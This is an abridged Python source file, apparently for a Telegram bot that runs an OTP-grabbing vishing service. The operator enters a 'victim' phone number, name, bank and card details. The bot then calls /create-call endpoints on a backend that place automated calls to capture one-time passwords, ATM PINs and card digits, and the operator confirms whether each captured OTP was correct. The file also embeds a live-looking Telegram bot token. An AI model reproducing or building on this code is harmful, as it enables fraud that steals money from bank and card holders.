...
url = "http://192.168.43.70/5000"
token = "5239249129:AAH6l7CBMzJ1pQWGYsTrPO5fVLYUziKbLTY"
section, bankName, bankNumber, bankAtmLength, bank, bankFinalCall, cardName, cardNumber, cardatmLength, cardType, cardFinalCall = range(
    11)
...
def createCallCard(update, context):
    ...
    print(v_numberr)
    r = requests.get(
        f"{url}/create-call/card?chat_id={update.message.from_user['id']}&victim={v_numberr}&bank={v_bank}&name={v_name}&card={v_type}")
...
def payCard(update, context):
    ...
    r = requests.get(
        f"{url}/create-call/pay?victim={payNumber}&name={payName}&bank={payAccName}&digits={payOtp}&atmDigits={payCardPin}&chat_id={update.message.from_user['id']}")
    update.message.reply_text("Call Initiated...")
...
def createCall(update, context):
    ...
    v_bank = update.message.text
    r = requests.get(
        f"{url}/create-call/bank?bank={v_bank}&victim={v_number}&digits={otpln}&atmDigits={atmln}&chat_id={update.message.from_user['id']}&name={v_name}")
    update.message.reply_text("Call Initiated...")
    update.message.reply_text("After getting OTP, Please reply '/true' or '/false' if OTP is Correct or Incorrect.")
    return 21
...
def account6(update, context):
    ...
    r = requests.get(
        f"{url}/create-call/account?victim={accountNumber}&name={accountName}&method={accountMethod}&account={accountChoice}&digits={accountotplength}&chat_id={update.message.from_user['id']}")
    update.message.reply_text("Call Initiated...")
    update.message.reply_text("After getting OTP, Please reply '/true' or '/false' if OTP is Correct or Incorrect.")
    return 22
...
def cardotp9(update, context):
    ...
    r = requests.get(
        f"{url}/create-call/cardotp?name={cardotpname}&amount={cardotpamount}&bank={cardotpbank}&chat_id={update.message.from_user['id']}&type={cardotptype}&site={cardotpsite}&victim={cardotpnumber}&digits={update.message.text}&end={cardotpend}")
    update.message.reply_text("Call Initiated...")
    update.message.reply_text("After getting OTP, Please reply '/true' or '/false' if OTP is Correct or Incorrect.")
    return 32
...
def main():
    ...
    conv_handler = ConversationHandler(
        ...
        states={
            0: [CommandHandler('cancel', cancel), CommandHandler('bank', bankFunc), CommandHandler('card', cardFunc),
                CommandHandler('pay', payFunc), CommandHandler('account', account), CommandHandler('cardotp', cardotp),
